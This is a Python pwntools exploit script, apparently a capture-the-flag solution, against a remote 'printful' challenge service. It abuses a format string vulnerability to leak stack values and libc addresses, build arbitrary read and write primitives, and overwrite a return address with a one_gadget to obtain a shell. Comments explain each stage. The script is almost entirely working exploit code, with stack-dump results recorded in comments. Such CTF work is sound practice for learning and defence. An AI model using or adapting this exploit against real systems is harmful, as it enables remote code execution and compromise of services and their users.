#!/usr/bin/env python3

from pwn import *

context.arch = "x86_64"
context.os = "linux"

r = remote("printful.challs.pwnoh.io", 1337, ssl=True)

# Quick helper function to convert 8 bytes into a 64 bit integer
def unpack_ptr(bytes):
    return u64(bytes.ljust(8, b"\0")[:8])

# The format string buffer is usually located at the 6th positional argument.
# This uses the format string vulnerability to read stack.
# The read can be done by using the %lx (long hex) format specifier.
# I can select which 8 byte element I want to read from the stack
# The offset is the distance from the internal printf arguments to the address to be read.
# The offset here must be 8 bytes aligned 
def arb_stack_read_ptr(offset):
    index = 6 + offset // 8
    r.sendlineafter(b"> ", f"%{index}$lx".encode())
    return int(r.recvline(drop=True), 16)

# This function will use the format string vulnerability to achieve an arbitrary read primitive.
# This is done by using the %s format specifier to read a string from an address.
# I can tell printf that the address of that string is located on the 7th positional argument, aka the 8–16 bytes of our format string.
def arb_read(address, size):
    data = b""

    # Keeps reading until I read 'size' bytes
    while len(data) < size:
        current_address = address + len(data)

        # The address is located at buffer+8, meaning it's at the 7th position
        # "----" act as padding for an 8 byte alignement and delimiters
        payload = b"%7$s----" + p64(current_address)
        r.sendlineafter(b"> ", payload)

        # Example: b"\x??\x??\x??\x??...\x??----"
        # I need to get everything before the delimiter
        data += r.recvuntil(b"----", drop=True)

        # Since the printing will only stop at a null character, so I need compensate for it
        data += p8(0)

    # Return only what was requested
    return data[:size]

# Simple wrapper around 'arb_read' to read 64 bit pointers
def arb_read_ptr(address):
    return unpack_ptr(arb_read(address, 8))

# This uses the "fmtstr_payload" from pwntools to craft a payload that will achieve an arbitrary write
def arb_write_ptr(address, value):
    payload = fmtstr_payload(6, {
        address: value
    })
    r.sendlineafter(b"> ", payload)

# # Dump stack
# for offset in range(0, 0x200, 8):
#     value = arb_stack_read_ptr(offset)
#     print(f"{hex(offset)}: {hex(value)}")
# 
# # Result of the stack dump:
# # 0x108: 0x1efec459bf3c300      <= stack canary
# # 0x110: 0x7ffeb46cc730         <= saved rbp
# # 0x118: 0x55f6300e32de         <= return address within main?
# 
# # 0x128: 0x7f9b0e10d083         <= LIBC return address
# # 0x130: 0x200000001            
# # 0x138: 0x7ffeb46cc828
# # 0x140: 0x10e2d17a0
# # 0x148: 0x55f6300e3283         <= main entrypoint address

frame1_offset = 0x108
frame2_offset = frame1_offset + 0x18 + 8

saved_rbp = arb_stack_read_ptr(frame1_offset + 0x08)
libc_ret = arb_stack_read_ptr(frame2_offset)

log.info(f"saved_rbp: {hex(saved_rbp)}")
log.info(f"libc_ret: {hex(libc_ret)}")

# # Dump instructions
# # The 0x20 is how many bytes backward
# backward_addr = libc_ret - 0x20
# 
# # The 'call reg' instruction is 2 bytes, this helps with finding the good offset.
# raw_data = arb_read(backward_addr, 0x20 + 2)
# disassembled = disasm(raw_data , vma=backward_addr)
# print(disassembled.rstrip())

# LIBC version: libc6_2.31-0ubuntu9.9_amd64

__environ = arb_read_ptr(libc_ret + 0x1c7e2d)
log.info(f"__environ: {hex(__environ)}")

libc_base = __environ - 0x1ef600
log.info(f"libc_base: {hex(libc_base)}")

one_gadget = libc_base + 0xe3b01
log.info(f"one_gadget: {hex(one_gadget)}")

frame2_addr = saved_rbp
libc_ret_addr = frame2_addr + 8

# Overwrite the LIBC return address
arb_write_ptr(libc_ret_addr, one_gadget)

# Send a "q" command to exit the main fuction
r.sendlineafter(b"> ", b"q")

# Our shell
r.interactive()
